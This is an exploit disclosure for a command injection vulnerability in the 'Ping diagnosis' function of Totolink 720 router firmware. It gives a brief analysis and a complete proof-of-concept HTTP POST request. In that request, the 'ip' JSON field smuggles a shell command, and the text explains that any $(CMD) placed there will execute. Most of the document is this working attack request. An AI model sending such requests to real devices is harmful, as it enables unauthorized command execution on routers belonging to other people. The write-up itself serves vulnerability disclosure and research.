#Exploit Title:Totolink 720 has a code execution vulnerability  
#Version:V4.1.5cu.374  
#Date:2022/08/16  
#Exploit Author:xiaohu816  
#Vendor Homepage:https://www.totolink.net/  
#Analysis Report: 
In the setdiagnosicfg function, the value string corresponding to the IP in the JSON data is directly put into V6  

![image](https://user-images.githubusercontent.com/111302002/184783693-4239eb22-9729-4d3b-8357-57af94abebb4.png)  

![image](https://user-images.githubusercontent.com/111302002/184783789-cdb09e00-feb1-4010-bc17-7ef477fe0da5.png)  
Just write a string such as $(CMD) in the value corresponding to the IP to complete the command injection at CMD  

POC:  
After the administrator logs in, enter "system tools" - > "Ping diagnosis" page  
执行tls>/tmp/1.txt命令  
``POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 52
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/diagnosis.html?time=1659889464870
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID=2:1591951611:2
Connection: close

{"ip":"aaaa\tls>/tmp/1.txt","num":"2","topicurl":"setDiagnosisCfg"}``
